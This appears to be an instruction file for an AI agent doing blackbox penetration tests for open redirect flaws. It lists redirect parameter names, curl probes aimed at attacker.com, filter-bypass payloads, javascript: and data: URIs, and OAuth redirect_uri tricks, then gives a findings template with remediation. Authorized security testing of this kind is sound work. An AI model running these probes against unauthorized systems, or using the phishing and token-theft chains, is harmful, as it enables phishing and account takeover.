---
name: blackbox-redirect
description: >-
  Actively test a target web application for Open Redirect vulnerabilities
  using blackbox techniques. Reads pentest/target-map.md, identifies URL/path
  redirect parameters (next, return, redirect, url, goto, etc.), injects
  external URLs and protocol-tricks, and confirms redirection to attacker-
  controlled domains. Writes confirmed findings with PoC URLs to
  pentest/redirect-results.md. Use when asked to find open redirect bugs in a
  blackbox pentest.
---

# Blackbox Open Redirect Detection

You are actively testing a web application for Open Redirect vulnerabilities without source code access. Open redirects can be used for phishing attacks and, when combined with OAuth flows, can lead to token theft.

**Prerequisite**: Read `pentest/target-map.md` before starting.

---

## Phase 1: Identify Redirect Parameters

Read `pentest/target-map.md` and find all parameters that control navigation:

**Common redirect parameter names**: `next`, `url`, `redirect`, `redirect_url`, `redirect_uri`, `return`, `return_url`, `returnUrl`, `returnTo`, `goto`, `target`, `destination`, `dest`, `back`, `continue`, `forward`, `from`, `location`, `r`, `ref`, `redir`, `path`

**High-value locations**:
- Login/logout pages: `?next=`, `?return=` (post-login redirect)
- OAuth/SSO: `redirect_uri` parameter
- Error pages and 404s
- Payment/checkout flows

Write candidates to `pentest/redirect-recon.md`.

---

## Phase 2: Basic Open Redirect Testing

### Test 1: Direct External URL

```bash
# Simple external redirect
curl -sk -D - -o /dev/null "<TARGET_URL>/login?next=https://attacker.com"
curl -sk -D - -o /dev/null "<TARGET_URL>/logout?redirect=https://attacker.com"
curl -sk -D - -o /dev/null "<TARGET_URL>/redirect?url=https://attacker.com"

# Check Location header in response
# Confirmed if: Location: https://attacker.com
```

### Test 2: Protocol Variants

```bash
# Double slash (scheme-relative)
curl -sk -D - -o /dev/null "<TARGET_URL>/login?next=//attacker.com"
curl -sk -D - -o /dev/null "<TARGET_URL>/login?next=///attacker.com"

# JavaScript protocol
curl -sk -D - -o /dev/null "<TARGET_URL>/login?next=javascript:alert(1)"

# Data URI
curl -sk -D - -o /dev/null "<TARGET_URL>/login?next=data:text/html,<script>alert(1)</script>"
```

---

## Phase 3: Filter Bypass Techniques

If basic redirects are blocked:

```bash
# URL encoding
curl -sk -D - -o /dev/null "<TARGET_URL>/login?next=https%3A%2F%2Fattacker.com"
curl -sk -D - -o /dev/null "<TARGET_URL>/login?next=%2F%2Fattacker.com"

# Double encoding
curl -sk -D - -o /dev/null "<TARGET_URL>/login?next=%252F%252Fattacker.com"

# @-trick (credentials in URL)
curl -sk -D - -o /dev/null "<TARGET_URL>/login?next=https://target.com@attacker.com"

# Backslash
curl -sk -D - -o /dev/null "<TARGET_URL>/login?next=https:\\\\attacker.com"
curl -sk -D - -o /dev/null "<TARGET_URL>/login?next=\\/\\/attacker.com"

# Whitespace
curl -sk -D - -o /dev/null "<TARGET_URL>/login?next=%09//attacker.com"  # tab
curl -sk -D - -o /dev/null "<TARGET_URL>/login?next=%20//attacker.com"  # space

# Fragment confusion
curl -sk -D - -o /dev/null "<TARGET_URL>/login?next=https://target.com#attacker.com"

# Parameter pollution
curl -sk -D - -o /dev/null "<TARGET_URL>/login?next=/dashboard&next=https://attacker.com"

# Subdomain bypass (if filter checks startsWith "target.com")
curl -sk -D - -o /dev/null "<TARGET_URL>/login?next=https://target.com.attacker.com"
curl -sk -D - -o /dev/null "<TARGET_URL>/login?next=https://target.com/redirect?url=https://attacker.com"
```

---

## Phase 4: OAuth redirect_uri Manipulation

If the app uses OAuth login:

```bash
# Find the OAuth authorization URL (usually visible on login page JS or as a link)
# Typically: GET /oauth/authorize?client_id=xxx&redirect_uri=https://target.com/callback&...

# Try injecting a different redirect_uri
curl -sk -D - -o /dev/null \
  "<OAUTH_PROVIDER>/authorize?client_id=TARGET_CLIENT_ID&redirect_uri=https://attacker.com&response_type=code&scope=openid"

# Path traversal on redirect_uri
curl -sk -D - -o /dev/null \
  "<OAUTH_PROVIDER>/authorize?client_id=TARGET_CLIENT_ID&redirect_uri=https://target.com/../&response_type=code"

# Extra path
curl -sk -D - -o /dev/null \
  "<OAUTH_PROVIDER>/authorize?client_id=TARGET_CLIENT_ID&redirect_uri=https://target.com/callback%2F%2F..%2F..attacker.com&response_type=code"
```

**Confirmed vulnerable** if the OAuth provider redirects the auth code to the attacker URL.

---

## Output Format

Write findings to `pentest/redirect-results.md`:

```markdown
# Open Redirect Assessment Results

## Executive Summary
- Parameters tested: [N]
- Confirmed Open Redirect: [N]
- OAuth redirect_uri bypass: [N]
- Not Vulnerable: [N]

## Findings

### [CONFIRMED] /login?next= — Open Redirect

- **Endpoint**: `GET /login?next=<URL>`
- **Parameter**: `next` (query string)
- **Impact**: Phishing — attacker sends link `https://target.com/login?next=https://phishing.com`; victim clicks, logs in, gets redirected to attacker site that mimics the real one
- **Chaining potential**: If combined with OAuth flows, can steal auth tokens
- **PoC**:
  ```bash
  curl -sk -D - -o /dev/null \
    "https://target.com/login?next=https://attacker.com"
  # Expected: HTTP 302
  # Location: https://attacker.com
  ```
  **Phishing URL**: `https://target.com/login?next=https://attacker.com/fake-dashboard`
- **Remediation**: Validate redirect destinations against a strict allowlist of internal paths. Reject any `next` value containing `://` or starting with `//`. Use relative paths only for post-login redirects.
```

After writing results, delete `pentest/redirect-recon.md`.
